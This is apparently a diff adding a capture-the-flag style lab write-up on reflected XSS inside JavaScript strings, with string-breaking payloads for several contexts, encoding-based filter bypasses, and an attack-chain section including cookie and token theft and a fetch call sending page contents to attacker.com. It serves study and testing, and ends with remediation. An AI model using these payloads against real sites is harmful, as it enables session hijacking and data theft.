@@ -7431,3 +7431,475 @@ If quotes are escaped
 → BREAK `<script>` instead  
 
 ---
+
+# 📝Lab-19 Reflected XSS - JavaScript String Context (Breaking Out of String) 
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates Reflected XSS where:
+
+- ✔ User input is reflected inside JavaScript  
+- ✔ Input is inside a quoted string  
+- ✔ Angle brackets `< >` are encoded ❌  
+- ✔ Must execute JavaScript without HTML injection  
+
+---
+
+## 🎯 Goal
+
+```
+alert(1)
+```
+
+---
+
+## ⚠️ Important in This Lab
+
+Input is inside JavaScript string:
+
+```
+var search = "INPUT";
+```
+
+👉 You are NOT in HTML  
+👉 You are inside JavaScript code  
+
+---
+
+## 🔄 Flow
+
+User Input → Server → JavaScript Response → Browser parses → String break → JS executes  
+
+---
+
+## 🧠 Source
+
+```
+?search=INPUT
+```
+
+---
+
+## 🧠 Sink
+
+```
+var search = "INPUT";
+```
+
+---
+
+## ⚠️ Important Behavior
+
+- `<script>` will NOT work ❌  
+- Angle brackets are encoded ❌  
+- Browser executes JS AFTER full parsing  
+- Syntax errors = NO execution  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Test Reflection
+
+```
+XSS123
+```
+
+✔ Appears inside JavaScript  
+
+---
+
+## 📸 Screenshot 1 — Reflection in JS String
+
+![js-reflection](../images/js-test-string-reflection.png)
+
+---
+
+### Step 2 — Identify Context
+
+```
+var search = "test123";
+```
+
+✔ JavaScript string context  
+
+---
+
+### Step 3 — Try Normal Payload
+
+```
+<script>alert(1)</script>
+```
+
+❌ Fails (encoded)  
+
+---
+
+### Step 4 — Break the String
+
+```
+"
+```
+
+Result:
+
+```
+var search = "";
+```
+
+✔ String closed  
+
+---
+
+### Step 5 — Inject JavaScript
+
+```
+";alert(1)
+```
+
+---
+
+### Step 6 — Fix Remaining Code
+
+```
+//
+```
+
+---
+
+## 💥 Final Payload
+
+```
+';alert(1)//
+```
+
+---
+
+### Step 7 — Final Execution
+
+```
+var search = '';alert(1)//';
+```
+
+✔ String closed  
+✔ JS executed  
+✔ Remaining code ignored  
+
+---
+
+## 📸 Screenshot 2 — Final Payload Execution
+
+![final-payload](../images/js-test-payload-execution.png)
+
+---
+
+## 🧠 Payload Breakdown
+
+---
+
+### 🎯 Payload
+
+```
+';alert(1)//
+```
+
+---
+
+### 1️⃣ `'`
+
+Closes original string  
+
+---
+
+### 2️⃣ `;`
+
+Ends statement  
+
+---
+
+### 3️⃣ `alert(1)`
+
+JavaScript execution  
+
+---
+
+### 4️⃣ `//`
+
+Comments out remaining code  
+
+---
+
+## 🔄 Execution Flow
+
+1️⃣ Input injected  
+2️⃣ String closed  
+3️⃣ New JS injected  
+4️⃣ Remaining code commented  
+5️⃣ Browser executes  
+6️⃣ alert triggers 💥  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Double Quote Context
+
+```
+var x = "INPUT";
+```
+
+Payload:
+
+```
+";alert(1)//
+```
+
+---
+
+### 🟢 Single Quote Context
+
+```
+var x = 'INPUT';
+```
+
+Payload:
+
+```
+';alert(1)//
+```
+
+---
+
+### 🟢 JSON Response
+
+```
+{"search":"INPUT"}
+```
+
+Payload:
+
+```
+\"-alert(1)}//
+```
+
+---
+
+### 🟢 Inside Script Tag
+
+```
+<script>
+var x = "INPUT";
+</script>
+```
+
+---
+
+### 🟢 Function Call
+
+```
+search("INPUT")
+```
+
+Payload:
+
+```
+");alert(1)//
+```
+
+---
+
+### 🟢 Array Context
+
+```
+var x = ["INPUT"];
+```
+
+Payload:
+
+```
+"];alert(1)//
+```
+
+---
+
+### 🟢 Object Property
+
+```
+var obj = {name: "INPUT"};
+```
+
+Payload:
+
+```
+"};alert(1)//
+```
+
+---
+
+### 🟢 Template Literal
+
+```
+var x = `INPUT`;
+```
+
+Payload:
+
+```
+`;alert(1)//
+```
+
+---
+
+## 🔥 Advanced Bypass Ideas
+
+---
+
+### When alert is blocked
+
+```
+';confirm(1)//
+';prompt(1)//
+```
+
+---
+
+### When quotes restricted
+
+```
+';eval(String.fromCharCode(97,108,101,114,116,40,49,41))//
+```
+
+---
+
+### When comments blocked
+
+```
+';alert(1)/*
+```
+
+---
+
+## ⚠️ Reality Check
+
+No payload is guaranteed  
+
+Apps may include:
+
+- Filters  
+- CSP  
+- Framework protections  
+- Encoding layers  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+
+```
+document.cookie
+```
+
+---
+
+### 🔥 Token Theft
+
+```
+localStorage.getItem("token")
+```
+
+---
+
+### 🔥 Data Exfiltration
+
+```
+fetch("https://attacker.com?d="+document.body.innerHTML)
+```
+
+---
+
+### 🔥 Phishing Redirect
+
+```
+location="https://fake-login.com"
+```
+
+---
+
+## 🧪 Testing Methodology
+
+---
+
+Step 1 → Find reflection  
+Step 2 → Identify JS context  
+Step 3 → Break quote  
+Step 4 → Inject JS  
+Step 5 → Fix syntax  
+Step 6 → Execute  
+
+---
+
+## ⚠️ Why This XSS Matters
+
+- No HTML needed  
+- Works even when `< >` blocked  
+- Common in modern apps  
+- Hard to detect  
+
+---
+
+## 🛡 Remediation
+
+- Avoid raw input in JS  
+- Use `JSON.stringify()`  
+- Avoid `eval()`  
+- Implement CSP  
+- Context-aware encoding  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+- Am I inside JS string?  
+- Which quote is used?  
+- Can I break it?  
+- Do I need `//`?  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Find input  
+↓  
+Detect JS context  
+↓  
+Break string  
+↓  
+Inject JS  
+↓  
+Fix syntax  
+↓  
+Execute  
+
+---
+
+## 🎯 Final Summary
+
+✔ Inside JS string  
+✔ Broke quote  
+✔ Injected JS  
+✔ Commented rest  
+
+→ XSS achieved 💥  
+
+---
